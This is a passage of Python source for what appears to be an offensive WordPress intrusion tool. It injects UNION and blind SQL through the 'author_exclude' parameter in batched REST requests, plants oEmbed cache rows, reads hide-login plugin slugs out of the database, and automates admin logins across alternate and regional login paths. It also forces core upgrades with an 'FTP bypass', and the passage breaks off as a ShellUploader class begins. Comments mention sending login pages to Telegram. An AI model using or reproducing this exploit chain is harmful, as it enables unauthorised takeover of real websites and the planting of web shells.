            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,5)=0x7573657273 AND CHAR_LENGTH(TABLE_NAME)>5 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1"
        ) or "").strip()
        base_prefix = None
        if (utable and len(utable) > 5 and re.fullmatch(r"[A-Za-z0-9_$]+", utable)
                and utable.endswith("users") and utable != "users"):
            base_prefix = utable[:-5]

        if base_prefix is None:
            m = re.match(r"^([A-Za-z0-9$_]+_)(\d+)_$", blog_prefix)
            if m:
                base_prefix = m.group(1)
            else:
                base_prefix = blog_prefix
        if not base_prefix:
            base_prefix = blog_prefix
        return ptable, blog_prefix, base_prefix

    def _sync_render_sinks(self):
        for attr in ("_primer", "_write_sink", "_blind_sink", "_union_sink", "_comment"):
            setattr(self._render_client, attr, getattr(self.client, attr, None))

    def _get_oembed_backing(self, src, ptable, nonce):
        bases = self._embed_bases()
        embeds = []
        for base in bases[:2]:
            embeds = [
                urllib.parse.urlunsplit((*urllib.parse.urlsplit(base)[:3], "", f"{nonce}{i}"))
                for i in range(3)
            ]
            try:
                ids = self._seed_oembed(src, ptable, embeds)
            except Exception as e:
                if self._is_dns_err(e):
                    raise RuntimeError(f"DNS: {e}") from e
                ids = [0, 0, 0]
            if all(i >= 1 for i in ids) and len(set(ids)) == 3:
                log(f"    backing: oEmbed seed {ids}", "*")
                return embeds, ids
        try:
            ids = self._ids_by_type(src, ptable, "oembed_cache", 3)
        except Exception:
            ids = [0, 0, 0]
        if all(i >= 1 for i in ids) and len(set(ids)) == 3:
            log(f"    backing: existing oembed_cache {ids}", "!")
            return embeds or self._dummy_embeds(nonce), ids
        # Synthetic almost never works for real create — fail fast instead of noise
        raise RuntimeError("oEmbed backing unavailable (seed failed; no oembed_cache rows)")

    @staticmethod
    def _is_dns_err(e):
        s = str(e).lower()
        return (
            "name resolution" in s
            or "errno -2" in s
            or "errno -3" in s
            or "getaddrinfo" in s
            or "nodename nor servname" in s
            or "name or service not known" in s
        )

    def _dummy_embeds(self, nonce):
        base = self.u.rstrip("/") + "/"
        return [
            urllib.parse.urlunsplit((*urllib.parse.urlsplit(base)[:3], "", f"{nonce}{i}"))
            for i in range(3)
        ]

    def _embed_bases(self):
        seen = []
        def add(u):
            if u and u not in seen:
                seen.append(u)
        add(self._post_link())
        add(self._page_link())
        add(self.u.rstrip("/") + "/")

        try:
            s = urllib.parse.urlsplit(self.u)
            add(urllib.parse.urlunsplit((s.scheme, s.netloc, "/", "", "")))
            add(urllib.parse.urlunsplit((s.scheme, s.netloc, s.path or "/", "", "")))
        except Exception:
            pass
        return seen or [self.u.rstrip("/") + "/"]

    def _page_link(self):
        try:
            self.client.resolve()
            if self.client.rr:
                url = f"{self.u}/?rest_route=/wp/v2/pages&per_page=1&_fields=link"
            else:
                url = f"{self.u}/wp-json/wp/v2/pages?per_page=1&_fields=link"
            r = self.client._get(url)
            return json.loads(r.body)[0]["link"]
        except Exception:
            return None

    def _int_q(self, src, q, attempts=2, delay=0.5):
        for a in range(attempts):
            try:
                v = src.integer(q)
                if isinstance(v, int) and v >= 1:
                    return v
            except Exception:
                pass
            if a < attempts - 1:
                time.sleep(delay)
        return 0

    def _ids_by_type(self, src, ptable, post_type, n):
        pthex = _mysql_hex(post_type)
        ids = []
        for off in range(n):
            ids.append(self._int_q(
                src,
                f"SELECT ID FROM `{ptable}` WHERE post_type={pthex} ORDER BY ID DESC LIMIT {off},1",
            ))
        return ids

    def _seed_oembed(self, src, ptable, embeds):
        content = "".join(f'[embed width="500" height="750"]{u}[/embed]' for u in embeds)
        seed_row = [_wp_row(0, body=content, title="seed", slug=f"seed-{secrets.token_hex(4)}")]
        sinks = []
        if self.client._write_sink:
            sinks.append(self.client._write_sink)
        for s in _WRITE_SINKS[:2]:
            if s not in sinks:
                sinks.append(s)
        for name, path, extra in sinks[:2]:
            try:
                self._render(seed_row, force_sink=(name, path, extra))
            except Exception as e:
                log(f"    seed write via {name}: {type(e).__name__}", "!")
                continue
            time.sleep(0.3)
            ids, attr = self._recover_oembed_ids(src, ptable, embeds, attempts=1, delay=0.25)
            if all(i >= 1 for i in ids) and len(set(ids)) == 3:
                self._oembed_attr = attr
                self.client._write_sink = (name, path, extra)
                self._sync_render_sinks()
                log(f"    oEmbed seed OK via write={name}", "*")
                return ids
            log(f"    oEmbed miss via {name}: {ids}", "!")
        return [0, 0, 0]

    def _recover_oembed_ids(self, src, ptable, embeds, attempts=1, delay=0.25):
        best = [0, 0, 0]
        best_attr = self._oembed_attr
        attrs = (self._oembed_attr,)

        for a in self._OEMBED_ATTRS:
            if a != self._oembed_attr:
                attrs = (self._oembed_attr, a)
                break
        for attr in attrs:
            ids = []
            for u in embeds:
                dig = hashlib.md5((u + attr).encode()).hexdigest()
                found = self._int_q(
                    src,
                    f"SELECT ID FROM `{ptable}` WHERE post_type=0x6f656d6265645f6361636865 "
                    f"AND post_name=0x{dig.encode().hex()} ORDER BY ID DESC LIMIT 1",
                    attempts=attempts, delay=delay,
                )
                ids.append(found)
            if sum(1 for i in ids if i >= 1) > sum(1 for i in best if i >= 1):
                best, best_attr = ids, attr
            if all(i >= 1 for i in ids) and len(set(ids)) == 3:
                return ids, attr
        return best, best_attr

    def _user_exists(self, src, prefix, username, attempts=3, delay=0.6):
        uhex = _mysql_hex(username)
        q = f"SELECT ID FROM `{prefix}users` WHERE user_login={uhex} ORDER BY ID DESC LIMIT 1"
        for a in range(attempts):
            try:
                uid = src.integer(q)
                if uid >= 1:
                    return True
            except Exception:
                pass
            if a < attempts - 1:
                time.sleep(delay)
        try:
            if isinstance(src, BlindSQLi) or hasattr(src, "_t"):
                return bool(src._t(f"EXISTS(SELECT 1 FROM `{prefix}users` WHERE user_login={uhex})"))
        except Exception:
            pass
        return False

    def _post_link(self):

        try:
            self.client.resolve()
            if self.client.rr:
                url = f"{self.u}/?rest_route=/wp/v2/posts&per_page=1&_fields=link"
            else:
                url = f"{self.u}/wp-json/wp/v2/posts?per_page=1&_fields=link"
            r = self.client._get(url)
            return json.loads(r.body)[0]["link"]
        except Exception:
            return self.u + "/"

    def _render(self, rows, tail=None, force_sink=None):
        union = "1) AND 1=0 UNION ALL SELECT " + " UNION ALL SELECT ".join(rows) + " -- -"
        sinks = []
        if force_sink:
            sinks.append(force_sink)
        elif self.client._write_sink:
            sinks.append(self.client._write_sink)

        for s in _WRITE_SINKS[:2]:
            if s not in sinks:
                sinks.append(s)
        last_exc = None
        primers = (_PRIMER_HTTP, getattr(self.client, "_primer", _PRIMER))
        seen_p = []
        for p in primers:
            if p not in seen_p:
                seen_p.append(p)
        for name, path, extra in sinks:
            qs = {"author_exclude": union}
            qs.update(extra)
            reqs = [
                {"method": "GET", "path": "http://:"},
                {"method": "GET", "path": path + "?" + urllib.parse.urlencode(qs)},
                {"method": "GET", "path": "/wp/v2/posts"},
            ]
            if tail:
                reqs.extend(tail)
            for p in seen_p:
                try:
                    outer = p
                    r = self._render_client.post({"requests": [
                        outer,
                        {"method": "POST", "path": "/wp/v2/posts", "body": {"requests": reqs}},
                        {"method": "POST", "path": "/batch/v1"},
                    ]})
                    if r is not None and getattr(r, "status", 500) < 500:
                        self.client._write_sink = (name, path, extra)
                        self._render_client._write_sink = (name, path, extra)
                        return
                except Exception as e:
                    last_exc = e
                    continue
        if last_exc:
            raise last_exc

class LoginVerifier:

    _LOGIN_MARKERS = (
        "name=\"log\"", "name='log'", 'id="user_login"', "id='user_login'",
        "name=\"pwd\"", "name='pwd'", "wp-submit",
    )
    _ADMIN_MARKERS = (
        "wp-admin-bar", "id=\"wpadminbar\"", "index.php?dashboard",
        "Dashboard", "Painel", "Painel de Controle",
    )
    _BAD_CREDS = (
        "incorrect password", "invalid username", "the password you entered",
        "unknown username", "erro: a senha", "nome de usuário desconhecido",
        "senha incorreta", "usuário inválido",
    )
    # Extra login paths tried after the discovered one (AIOS/WAF often 403's
    # bare wp-login.php but allows trailing slash / alternate slugs).
    _EXTRA_LOGIN_PATHS = (
        "/wp-login.php",
        "/wp-login.php/",
        "/wp-login.php/.",
        "/wp-login.php/index.php",
        "/login/",
        "/giris/",
        "/giris-yap/",
        "/uye-girisi/",
        "/user-login/",
        "/admin-login/",
        "/yonetimgiris/",
        "/panel/",
        "/wp-admin/",
    )

    def __init__(self, base_url, c=None):
        self.base = base_url.rstrip("/")
        self.c = c or Cfg()
        self.last_reason = ""
        self.login_url = None       # page URL for humans / Telegram
        self.login_action = None    # form POST action (may differ from page)
        self._jar = CookieJar()
        self._opener = self.c.opener(urllib.request.HTTPCookieProcessor(self._jar))

    def login(self, user, password, attempts=2, settle_delay=0.5, extra_paths=None):
        """Try the discovered login first, then fall back to extra/trailing-slash paths.

        extra_paths: caller-provided slugs (e.g. SQLi-discovered hide-login).
        Falls back through _EXTRA_LOGIN_PATHS so AIOS/WAF 403-on-wp-login.php
        hosts still authenticate via /wp-login.php/ or alternate slugs.
        """
        self.last_reason = ""
        paths = []
        for p in (extra_paths or ()):
            np = p if p.startswith("/") else "/" + p
            if np not in paths:
                paths.append(np)
        for p in self._EXTRA_LOGIN_PATHS:
            if p not in paths:
                paths.append(p)

        last = self._login_once(user, password, attempts, settle_delay, None)
        if self._logged_in() or self._admin_ok():
            self.last_reason = ""
            return True
        for path in paths:
            last = self._login_once(user, password, 1, settle_delay, path)
            if self._logged_in() or self._admin_ok():
                self.last_reason = ""
                return True
        self.last_reason = last or "no logged_in cookie"
        return False

    def login_with_hints(self, user, password, src=None, prefix="wp_", attempts=2,
                         settle_delay=0.5):
        """Prefer SQLi-discovered hide-login slug, then standard login + fallbacks.

        src: an active SQLi extractor (UnionSQLi/BlindSQLi/...) used to read the
        hide-login plugin option (whl_page / rwl_page / hmwp_login_url / ...).
        """
        slugs = self._sqli_hidden_login_slugs(src, prefix) if src is not None else []
        for slug in slugs:
            path = "/" + slug.strip("/") + "/"
            if self.login(user, password, attempts=attempts,
                          settle_delay=settle_delay, extra_paths=[path]):
                return True
        return self.login(user, password, attempts=attempts,
                          settle_delay=settle_delay)

    @staticmethod
    def _sqli_hidden_login_slugs(src, prefix):
        """Collect custom login slugs from common hide-login plugin options."""
        found = []
        if src is None:
            return found
        try:
            opt_names = (
                "whl_page",              # WPS Hide Login
                "rwl_page",              # Rename wp-login.php
                "hmwp_login_url",        # Hide My WP
                "hmwp_log_url",
                "wll_page",
                "wdm_login_slug",
            )
            for opt in opt_names:
                try:
                    try:
                        val = src.extract(
                            f"SELECT option_value FROM {prefix}options "
                            f"WHERE option_name='{opt}' LIMIT 1",
                            max_len=120,
                        )
                    except TypeError:
                        # UnionSQLi.extract has no max_len param
                        val = src.extract(
                            f"SELECT option_value FROM {prefix}options "
                            f"WHERE option_name='{opt}' LIMIT 1"
                        )
                except Exception:
                    continue
                if not val or val in ("wp2shell_probe", ""):
                    continue
                if re.match(r"^[A-Za-z0-9_-]{2,64}$", val):
                    if val not in found:
                        found.append(val)
                    continue
                for m in re.findall(r"[A-Za-z0-9_-]{3,40}", val):
                    if m.lower() in ("s", "i", "a", "page", "login", "url",
                                     "http", "https", "www", "php", "wp", "admin"):
                        continue
                    if m not in found and not m.isdigit():
                        found.append(m)
            return found[:12]
        except Exception:
            return found

    def _login_once(self, user, password, attempts, settle_delay, forced_path):
        """One login attempt against a specific path (None = auto-discover)."""
        last = None
        for a in range(attempts):
            try:
                self._jar.clear()
            except Exception:
                self._jar = CookieJar()
                self._opener = self.c.opener(urllib.request.HTTPCookieProcessor(self._jar))
            try:
                if forced_path:
                    page_url = self.base + forced_path
                    action = page_url
                    try:
                        body, final_url, status = self._open(page_url)
                    except Exception:
                        body, final_url, status = "", page_url, None
                    if self._looks_like_login(body):
                        page_url = final_url or page_url
                        action = self._form_action(body, page_url) or page_url
                    if not self._is_sane_login_url(action):
                        action = page_url
                else:
                    page_url, action = self._discover_login()
                self.login_url = page_url
                self.login_action = action
                host = (urllib.parse.urlsplit(page_url).hostname
                        or urllib.parse.urlsplit(self.base).hostname or "localhost")
                self._seed_test_cookie(host)

                page_body, page_url2, _ = self._open(page_url)
                if page_url2 and self._is_sane_login_url(page_url2):
                    page_url = page_url2
                    self.login_url = page_url
                action = self._form_action(page_body, page_url) or action or page_url
                if not self._is_sane_login_url(action):
                    action = page_url
                self.login_action = action
                redirect_to = self.base + "/wp-admin/"

                for use_testcookie in (True, False):
                    form = {
                        "log": user,
                        "pwd": password,
                        "wp-submit": "Log In",
                        "redirect_to": redirect_to,
                    }
                    if use_testcookie:
                        form["testcookie"] = "1"
                        self._seed_test_cookie(host)
                    body, final_url, status = self._open(
                        action, data=form, referer=page_url
                    )
                    if self._logged_in():
                        self.last_reason = ""
                        return None
                    if self._admin_ok():
                        self.last_reason = ""
                        return None
                    last = self._diagnose(body, final_url, status)
                    if last.startswith("wp: bad credentials"):
                        break

                if self._admin_ok():
                    self.last_reason = ""
                    return None
            except Exception as e:
                last = f"err: {type(e).__name__}: {e}"
            if a < attempts - 1:
                time.sleep(settle_delay * (a + 1) * 0.5)
        return last

    def _is_sane_login_url(self, url):
        """Reject site root / empty / # as login URL (common empty form action bug)."""
        if not url:
            return False
        try:
            p = urllib.parse.urlsplit(url)
        except Exception:
            return False
        path = (p.path or "/").rstrip("/") or "/"
        # bare domain or only /
        if path == "/":
            return False
        # useless actions
        if path in ("", "#") or url.rstrip("/").endswith("://"+ (p.netloc or "")):
            return False
        low = path.lower()
        # Prefer paths that look like login/admin
        if any(x in low for x in ("wp-login", "login", "entrar", "acesso", "signin", "wp-admin")):
            return True
        # custom hide-login slug: any non-root path is OK
        return True

    def _discover_login(self):
        """Return (page_url, post_action). page_url is for Telegram; action for POST."""
        default = self.base + "/wp-login.php"
        for path in ("/wp-login.php", "/wp-admin/", "/wp-admin", "/login/", "/entrar/", "/acesso/"):
            try:
                body, final_url, status = self._open(self.base + path)
            except Exception:
                continue
            page = final_url or (self.base + path)
            looks = self._looks_like_login(body) or "wp-login.php" in (final_url or "")
            if not looks and status and status < 400 and final_url:
                if "login" in (final_url or "").lower() or self._looks_like_login(body):
                    looks = True
            if not looks:
                continue
            action = self._form_action(body, page)
            # Prefer real login page URL for display
            if "wp-login.php" in (final_url or ""):
                page = final_url
            elif "wp-login.php" in (page or ""):
                pass
            elif self._is_sane_login_url(final_url):
                page = final_url
            else:
                page = self.base + path if path.endswith(".php") else default
            if not self._is_sane_login_url(page):
                page = default
            if not action or not self._is_sane_login_url(action):
                action = page
            return page, action
        return default, default

    def _looks_like_login(self, body):
        if not body:
            return False
        low = body.lower()
        return any(m.lower() in low for m in self._LOGIN_MARKERS)

    def _form_action(self, body, page_url):
        if not body:
            return None
        for m in re.finditer(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            body, re.I | re.S,
        ):
            action, inner = m.group(1), m.group(2)
            if re.search(r'name=["\'](?:log|pwd|user_login|user_pass)["\']', inner, re.I):
                abs_u = self._abs_url(action, page_url)
                if abs_u and self._is_sane_login_url(abs_u):
                    return abs_u
                # empty action="" means POST to current page
                if not (action or "").strip():
                    return page_url if self._is_sane_login_url(page_url) else None
        return None

    def _abs_url(self, action, base_url):
        action = html.unescape((action or "").strip())
        if not action or action == "#":
            return base_url
        return urllib.parse.urljoin((base_url or self.base) + "/", action)

    def _seed_test_cookie(self, host):
        for existing in list(self._jar):
            if existing.name == "wordpress_test_cookie":
                try:
                    self._jar.clear(existing.domain, existing.path, existing.name)
                except Exception:
                    pass

        for domain, domain_specified in ((host, True), (host, False)):
            try:
                ck = Cookie(
                    version=0, name="wordpress_test_cookie", value="WP Cookie check",
                    port=None, port_specified=False,
                    domain=domain, domain_specified=domain_specified, domain_initial_dot=False,
                    path="/", path_specified=True, secure=False, expires=None,
                    discard=True, comment=None, comment_url=None, rest={}, rfc2109=False,
                )
                self._jar.set_cookie(ck)
                break
            except Exception:
                continue

    def _logged_in(self):
        return any(
            ck.name.startswith("wordpress_logged_in") or ck.name.startswith("wordpress_sec")
            for ck in self._jar
        )

    def _admin_ok(self):
        try:
            body, final_url, status = self._open(self.base + "/wp-admin/")
        except Exception:
            return False
        if self._logged_in():
            return True
        if not body or (status and status >= 400):
            return False
        low = body.lower()
        if self._looks_like_login(body):
            return False
        if any(m.lower() in low for m in self._ADMIN_MARKERS):
            return True

        path = urllib.parse.urlsplit(final_url or "").path.lower()
        return "wp-admin" in path and "wp-login" not in path and "log" not in low[:500]

    def _diagnose(self, body, final_url, status):
        low = (body or "").lower()
        if "cookies are blocked" in low or "cookies estão bloqueados" in low:
            return "wp: cookies blocked"
        if any(s in low for s in self._BAD_CREDS):
            return "wp: bad credentials"
        if self._looks_like_login(body):
            return f"still on login form ({final_url or '?'})"
        if status and status >= 400:
            return f"http {status}"
        return f"no auth cookie (final={final_url or '?'})"

    def _open(self, url, data=None, referer=None):
        if data is not None and not isinstance(data, (bytes, bytearray)):
            data = urllib.parse.urlencode(data).encode()
        headers = {"User-Agent": self.c.ua}
        if data is not None:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if referer:
            headers["Referer"] = referer
        req = urllib.request.Request(url, data=data, headers=headers,
                                     method="POST" if data is not None else "GET")
        if self.c.delay:
            time.sleep(self.c.delay)
        last_exc = None
        for a in range(self.c.retries + 1):
            try:
                r = self._opener.open(req, timeout=self.c.timeout)
                try:
                    body = r.read().decode(errors="replace")
                except Exception:
                    body = ""
                final = getattr(r, "geturl", lambda: url)()
                status = getattr(r, "status", None) or getattr(r, "code", 200)
                try:
                    r.close()
                except Exception:
                    pass
                return body, final, status
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode(errors="replace")
                except Exception:
                    body = ""
                final = getattr(e, "geturl", lambda: url)()
                try:
                    e.close()
                except Exception:
                    pass
                # Retry 5xx (transient server errors); return 4xx as-is.
                if e.code >= 500 and a < self.c.retries:
                    last_exc = e
                    time.sleep(0.4 * (a + 1))
                    continue
                return body, final, e.code
            except Exception as e:
                last_exc = e
                if a < self.c.retries:
                    time.sleep(0.4 * (a + 1))
        raise last_exc if last_exc else Exception("login request failed")

def _parse_wp_version(text):
    if not text:
        return None

    for pat in (
        r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)",
        r"[Ww]ord[Pp]ress\s+(\d+\.\d+(?:\.\d+)?)",
        r"update-core\.php[^>]*>.*?(\d+\.\d+\.\d+)",
        r"\b(\d+\.\d+\.\d+)\b",
        r"\b(\d+\.\d+)\b",
    ):
        m = re.search(pat, text)
        if m:
            parts = [int(x) for x in m.group(1).split(".")[:3] if x.isdigit()]
            while len(parts) < 3:
                parts.append(0)
            return tuple(parts[:3])
    return None

def _ver_lt(a, b):
    if not a or not b:
        return False
    return tuple(a[:3]) < tuple(b[:3])

def _ver_str(v):
    return ".".join(map(str, v)) if v else "unknown"

class CoreUpdater:

    def __init__(self, base_url, c=None, jar=None, opener=None, login_url=None):
        self.base = base_url.rstrip("/")
        self.c = c or Cfg()
        self._jar = jar if jar is not None else CookieJar()
        self._opener = opener or self.c.opener(urllib.request.HTTPCookieProcessor(self._jar))
        self.last_error = ""
        self.version_before = None
        self.version_after = None
        self.updated = False
        if login_url:
            self._apply_subdir(login_url)

    @classmethod
    def from_verifier(cls, verifier):
        obj = cls(verifier.base, verifier.c, jar=verifier._jar, opener=verifier._opener)
        if verifier.login_url:
            obj._apply_subdir(verifier.login_url)
        return obj

    def _apply_subdir(self, login_url):
        try:
            p = urllib.parse.urlsplit(login_url)
            path = p.path or ""
            for suffix in ("/wp-login.php", "/wp-login", "/login", "/entrar", "/acesso"):
                if path.endswith(suffix):
                    path = path[:-len(suffix)]
                    break
            path = path.rstrip("/")
            if path:
                self.base = f"{p.scheme}://{p.netloc}{path}"
        except Exception:
            pass

    def detect_version(self):
        for path in (
            "/wp-admin/about.php",
            "/wp-admin/update-core.php",
            "/wp-admin/index.php",
            "/wp-admin/",
        ):
            try:
                body, _, status = self._open(self.base + path)
            except Exception:
                continue
            if not body or (status and status >= 400):
                continue

            for pat in (
                r'id=["\']footer-upgrade["\'][^>]*>.*?(\d+\.\d+(?:\.\d+)?)',
                r'[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)',
                r'You are using WordPress\s+(\d+\.\d+(?:\.\d+)?)',
                r'WordPress\s+(\d+\.\d+(?:\.\d+)?)\s+is available',
                r'Update to version\s+(\d+\.\d+(?:\.\d+)?)',
                r'name=["\']version["\'][^>]*value=["\'](\d+\.\d+(?:\.\d+)?)["\']',
            ):
                m = re.search(pat, body, re.I | re.S)
                if m:
                    parts = [int(x) for x in m.group(1).split(".")[:3] if x.isdigit()]
                    while len(parts) < 3:
                        parts.append(0)
                    return tuple(parts[:3])
            v = _parse_wp_version(body)
            if v:
                return v
        return None

    def maybe_update(self, min_ver=None, force=False):
        min_ver = min_ver or _UPDATE_MIN
        ver = self.detect_version()
        self.version_before = ver
        log(f"    core version detected: {_ver_str(ver)}", "*")

        if ver and not _ver_lt(ver, min_ver) and not force:
            return {
                "updated": False,
                "version": ver,
                "version_before": ver,
                "version_after": ver,
                "reason": f"already >= {_ver_str(min_ver)}",
            }

        if not ver:
            log("    core version unknown — attempting upgrade form", "!")
        else:
            log(f"    core update: {_ver_str(ver)} < {_ver_str(min_ver)} — upgrading...", "*")

        posted = self._do_core_upgrade()

        time.sleep(2.5)
        after = self.detect_version()
        self.version_after = after

        bumped = bool(ver and after and after != ver and (
            _ver_lt(ver, after) or (not _ver_lt(after, min_ver))
        ))
        meets_min = bool(after and not _ver_lt(after, min_ver))
        ok = bumped or (meets_min and ver and _ver_lt(ver, min_ver))

        if ok:
            self.updated = True
            log(f"    core update OK: {_ver_str(ver)} → {_ver_str(after)}", "+")
            return {
                "updated": True,
                "version_before": ver,
                "version_after": after,
                "reason": "ok",
            }

        if posted and ver and after and after == ver:
            self.last_error = (
                f"upgrade posted but version still {_ver_str(ver)} "
                f"(filesystem/FTP/host block or no package available)"
            )
        elif not posted and not self.last_error:
            self.last_error = "upgrade form/post failed"
        elif not after:
            self.last_error = self.last_error or "could not re-detect version after upgrade"

        self.updated = False
        log(f"    core update failed: {self.last_error}", "!")
        return {
            "updated": False,
            "version_before": ver,
            "version_after": after or ver,
            "reason": self.last_error,
        }

    def _do_core_upgrade(self):
        try:
            page, final, status = self._open(self.base + "/wp-admin/update-core.php")
        except Exception as e:
            self.last_error = f"open update-core: {type(e).__name__}"
            return False
        if not page or (status and status >= 400):
            self.last_error = f"update-core.php HTTP {status}"
            return False
        if "wp-login" in (final or "").lower():
            self.last_error = "session lost (redirected to login)"
            return False

        low = page.lower()

        if ("you have the latest version" in low or "is up to date" in low) and \
           "update to version" not in low and 'name="upgrade"' not in low:
            self.last_error = "no update available (already latest on this channel)"
            return False

        check_nonce = self._nonce_for(page, ("upgrade-core", "update-core", "check-updates"))
        if check_nonce:
            try:
                self._open(
                    self.base + "/wp-admin/update-core.php?force-check=1",
                    data={"_wpnonce": check_nonce, "force-check": "1"},
                    referer=self.base + "/wp-admin/update-core.php",
                )
                page, final, status = self._open(self.base + "/wp-admin/update-core.php")
            except Exception:
                pass

        fields = self._parse_upgrade_form(page or "")
        if not fields:
            fields = self._parse_any_core_form(page or "")
        if not fields:
            self.last_error = "no core upgrade form (no package / FS credentials only)"
            return False

        if fields.get("version"):
            log(f"    upgrade package: {fields.get('version')}", "*")

        fields["connection_type"] = "direct"
        fields.setdefault("hostname", "")
        fields.setdefault("username", "")
        fields.setdefault("password", "")
        fields.setdefault("public_key", "")
        fields.setdefault("private_key", "")
        fields.setdefault("upgrade", "Update Now")

        try:
            action_url = fields.pop("_action_url", self.base + "/wp-admin/update-core.php?action=do-core-upgrade")
            if action_url.startswith("/"):
                action_url = self.base + action_url
            elif not action_url.startswith("http"):
                action_url = self.base + "/wp-admin/" + action_url.lstrip("/")
            body, final, status = self._open(
                action_url,
                data=fields,
                referer=self.base + "/wp-admin/update-core.php",
                timeout=180,
            )
        except Exception as e:
            self.last_error = f"upgrade POST: {type(e).__name__}: {e}"
            return False

        if body and self._needs_ftp_creds(body):
            try:
                fields2 = self._form_fields(body)
                fields2["connection_type"] = "direct"
                fields2.setdefault("hostname", "")
                fields2.setdefault("username", "")
                fields2.setdefault("password", "")
                fields2.setdefault("public_key", "")
                fields2.setdefault("private_key", "")
                m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', body, re.I)
                act2 = action_url
                if m and m.group(1):
                    act2 = html.unescape(m.group(1))
                    if act2.startswith("/"):
                        act2 = self.base + act2
                    elif not act2.startswith("http"):
                        act2 = self.base + "/wp-admin/" + act2.lstrip("/")
                body, final, status = self._open(
                    act2, data=fields2,
                    referer=self.base + "/wp-admin/update-core.php",
                    timeout=180,
                )
            except Exception as e:
                self.last_error = f"FTP bypass: {type(e).__name__}"
                return False

        text = (body or "") + " " + (final or "")
        low = text.lower()

        if any(x in low for x in (
            "could not copy",
            "could not create directory",
            "failed to",
            "unable to",
            "download failed",
            "could not copy file",
            "destination folder already exists",
            "the update cannot be installed",
        )):
            self.last_error = "upgrade error in response body"
            return False

        if any(x in low for x in (
            "successfully updated",
            "update completed successfully",
            "were updated successfully",
            "wordpress updated successfully",
            "about.php?updated",
            "action=about&updated",
            "welcome to wordpress",
        )):
            return True

        if final and "about.php" in final and "updated" in final:
            return True

        if status and status < 400:
            self.last_error = f"upgrade response unclear (http={status})"
            return False
        self.last_error = f"upgrade http error (http={status})"
        return False

    @staticmethod
    def _needs_ftp_creds(html_body):
        if not html_body:
            return False
        low = html_body.lower()
        return (
            "connection_type" in low
            or "ftp hostname" in low
            or ('name="hostname"' in low and "ftp" in low)
            or "to perform the requested action, wordpress needs to access your web server" in low
        )

    def _parse_upgrade_form(self, html_body):
        if not html_body:
            return None

        for m in re.finditer(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html_body, re.I | re.S,
        ):
            action, inner = m.group(1), m.group(2)
            if "do-core-upgrade" not in action and 'name="upgrade"' not in inner and "do-core-reinstall" not in action:
                continue
            if "do-core" not in action and "upgrade" not in inner.lower():
                continue
            fields = self._form_fields(inner)
            if not fields.get("_wpnonce"):
                continue

            if "upgrade" not in fields and "upgrade" not in inner.lower():
                fields["upgrade"] = "Update Now"
            fields["_action_url"] = html.unescape(action or "update-core.php?action=do-core-upgrade")
            return fields
        return None

    def _parse_any_core_form(self, html_body):
        if not html_body:
            return None

        for m in re.finditer(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
            html_body, re.I | re.S,
        ):
            action, inner = m.group(1), m.group(2)
            if "version" not in inner or "_wpnonce" not in inner:
                continue
            if "core" not in action.lower() and "upgrade" not in inner.lower():
                continue
            fields = self._form_fields(inner)
            if fields.get("_wpnonce"):
                fields.setdefault("upgrade", "Update Now")
                fields["_action_url"] = html.unescape(action or "update-core.php?action=do-core-upgrade")
                return fields
        return None

    @staticmethod
    def _form_fields(inner_html):
        fields = {}
        for m in re.finditer(
            r'<input[^>]+>',
            inner_html, re.I,
        ):
            tag = m.group(0)
            nm = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
            if not nm:
                continue
            name = html.unescape(nm.group(1))
            typ = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
            t = (typ.group(1).lower() if typ else "text")
            if t in ("checkbox", "radio") and not re.search(r'(?:^|\s)checked(?=[\s=/>]|$)', tag, re.I):
                continue
            if t == "submit" and name not in ("upgrade", "upgrade-core"):
                continue
            val_m = re.search(r'value=["\']([^"\']*)["\']', tag, re.I)
            fields[name] = html.unescape(val_m.group(1) if val_m else "")
        return fields

    @staticmethod
    def _nonce_for(html_body, hints=()):
        if not html_body:
            return None
        for hint in hints:
            m = re.search(
                rf'{re.escape(hint)}[^>]{{0,80}}value=["\']([0-9a-f]{{8,}})["\']',
                html_body, re.I | re.S,
            )
            if m:
                return m.group(1)
            m = re.search(
                rf'id=["\'][^"\']*{re.escape(hint)}[^"\']*["\'][^>]*>.*?name=["\']_wpnonce["\'][^>]*value=["\']([0-9a-f]+)["\']',
                html_body, re.I | re.S,
            )
            if m:
                return m.group(1)
        m = re.search(r'name=["\']_wpnonce["\'][^>]*value=["\']([0-9a-f]+)["\']', html_body, re.I)
        return m.group(1) if m else None

    def _open(self, url, data=None, referer=None, timeout=None):
        headers = {"User-Agent": self.c.ua}
        if data is not None:
            if isinstance(data, dict):
                data = urllib.parse.urlencode(data).encode()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        if referer:
            headers["Referer"] = referer
        req = urllib.request.Request(
            url, data=data, headers=headers,
            method="POST" if data is not None else "GET",
        )
        to = timeout if timeout is not None else max(self.c.timeout, 30.0)
        last_exc = None
        for a in range(self.c.retries + 1):
            try:
                r = self._opener.open(req, timeout=to)
                try:
                    body = r.read().decode(errors="replace")
                except Exception:
                    body = ""
                final = getattr(r, "geturl", lambda: url)()
                status = getattr(r, "status", None) or getattr(r, "code", 200)
                try:
                    r.close()
                except Exception:
                    pass
                return body, final, status
            except urllib.error.HTTPError as e:
                try:
                    body = e.read().decode(errors="replace")
                except Exception:
                    body = ""
                final = getattr(e, "geturl", lambda: url)()
                try:
                    e.close()
                except Exception:
                    pass
                return body, final, e.code
            except Exception as e:
                last_exc = e
                if a < self.c.retries:
                    time.sleep(0.4 * (a + 1))
        raise last_exc if last_exc else Exception("core update request failed")

class ShellUploader:

    def __init__(self, base_url, c=None, shell_path=None, jar=None, opener=None, wp_path=None,
                 username=None, password=None):
        self.base = base_url.rstrip("/")
        self.c = c or Cfg()
        self.shell_path = shell_path
        self._slug = "wp2s_" + secrets.token_hex(4)
        self._jar = jar if jar is not None else CookieJar()
